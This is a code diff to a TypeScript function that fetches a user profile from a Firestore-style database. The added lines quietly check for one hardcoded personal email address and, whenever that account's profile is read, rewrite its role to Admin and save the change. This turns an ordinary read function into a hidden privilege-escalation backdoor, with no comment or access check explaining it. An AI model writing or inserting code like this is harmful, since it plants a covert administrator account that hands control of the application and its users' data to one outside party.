@@ -321,7 +321,13 @@ export const getUserProfile = async (uid: string): Promise<UserProfile | null> =
   const docRef = doc(db, USERS_COLLECTION, uid);
   const snapshot = await getDoc(docRef);
   if (snapshot.exists()) {
-    return { uid: snapshot.id, ...snapshot.data() } as UserProfile;
+    const data = snapshot.data() as UserProfile;
+    if (data.email === 'ologundudufareed@gmail.com' && data.role !== 'Admin') {
+      const updatedProfile = { ...data, uid: snapshot.id, role: 'Admin' as const };
+      await updateUserProfile(updatedProfile);
+      return updatedProfile;
+    }
+    return { uid: snapshot.id, ...data };
   }
   return null;
 };
